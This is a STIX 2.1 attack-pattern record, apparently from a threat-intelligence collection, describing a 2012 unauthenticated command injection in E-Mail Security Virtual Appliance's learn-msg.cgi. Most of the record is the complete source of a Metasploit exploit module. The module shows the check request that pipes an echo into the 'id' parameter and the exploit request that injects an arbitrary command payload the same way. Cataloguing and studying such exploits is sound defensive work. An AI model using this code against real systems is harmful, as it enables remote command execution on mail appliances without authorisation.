{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b8ac416-a78d-4110-ab20-1bcba36c159d",
    "created": "2024-08-14T17:04:06.081344Z",
    "modified": "2024-08-14T17:04:06.081347Z",
    "name": "\"E-Mail Security Virtual Appliance learn-msg.cgi Command Injection\"",
    "description": " This module exploits a command injection vulnerability found in E-Mail Security Virtual Appliance. This module abuses the learn-msg.cgi file to execute arbitrary OS commands without authentication. This module has been successfully tested on the ESVA_2057 appliance.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/esva_exec.rb",
            "external_id": "esva_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"E-Mail Security Virtual Appliance learn-msg.cgi Command Injection\",\n      'Description'    => %q{\n          This module exploits a command injection vulnerability found in E-Mail Security\n        Virtual Appliance. This module abuses the learn-msg.cgi file to execute arbitrary\n        OS commands without authentication. This module has been successfully tested on the\n        ESVA_2057 appliance.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'iJoo', # Vulnerability Discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '85462'],\n          [ 'BID', '55050'],\n          [ 'EDB', '20551' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl python',\n            }\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['ESVA_2057', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-08-16',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def check\n    clue = Rex::Text::rand_text_alpha(rand(5) + 5)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => \"/cgi-bin/learn-msg.cgi\",\n      'vars_get' => {\n        'id' => \"|echo #{clue};\"\n      }\n    })\n\n    # If the server doesn't return the default redirection, probably something is wrong\n    if res and res.code == 200 and res.body =~ /#{clue}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n\n    print_status(\"Sending Command injection\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => \"/cgi-bin/learn-msg.cgi\",\n      'vars_get' => {\n        'id' => \"|#{payload.raw};\"\n      }\n    })\n\n    # If the server doesn't return the default redirection, probably something is wrong\n    if not res or res.code != 200 or res.body !~ /meta http-equiv=\"refresh\" content=\"0;URL=\\/learned.html\"/\n      print_error(\"Probably command not executed, aborting!\")\n      return\n    end\n\n    print_good(\"Command executed successfully\")\n    print_status(\"Output: \\n#{res.body.split(\"Learned tokens\")[0]}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-16",
    "x_mitre_platforms": [
        "['unix']"
    ]
}